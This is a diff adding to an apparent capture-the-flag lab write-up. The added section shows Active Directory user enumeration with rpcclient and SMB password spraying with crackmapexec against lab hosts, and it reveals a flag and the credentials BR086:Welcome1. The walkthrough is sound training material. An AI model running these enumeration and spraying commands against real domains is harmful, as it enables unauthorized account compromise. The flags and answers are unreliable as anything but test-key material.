@@ -161,3 +161,29 @@ Using the identified credentials, I initiated an RDP session to the MS01 host:
 xfreerdp /u:AB920  /p:weasal /d:INLANEFREIGHT.LOCAL  /v:172.16.7.50
 ```
 Once connected, I navigated to  C:\ and successfully retrieved the flag: aud1t_gr0up_m3mbersh1ps!
+
+
+4- **Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.**
+5- **What is this user's password?**
+
+I started by using rpcclient to enumerate the domain users on the target machine. I ran the following command to get a list of usernames:
+```c
+
+rpcclient -U AB920%weasal 172.16.7.3 -c 'enumdomusers' | awk '{print $1}' > usernames.txt
+```
+Next, I cleaned up the extracted usernames by removing unnecessary characters. I used sed to clean up the list:
+```c
+sed 's/user://g' usernames.txt | sed 's/\[\|\]//g' > cleaned_usernames.txt
+```
+Once I had the cleaned list of usernames, I attempted to crack the SMB credentials using common passwords. I started with Password123:
+```c
+┌─[✗]─[htb-student@skills-par01]─[~/Desktop]
+└──╼ $sudo crackmapexec smb 172.16.7.3 -u cleaned_usernames.txt -p Password123 | grep +
+```
+Since the first attempt didn't work, I tried another common password, Welcome1:
+```c
+┌─[✗]─[htb-student@skills-par01]─[~/Desktop]
+└──╼ $sudo crackmapexec smb 172.16.7.3 -u cleaned_usernames.txt -p Welcome1 | grep +
+SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
+```
+I got a valid credential match for the user BR086 with the password Welcome1
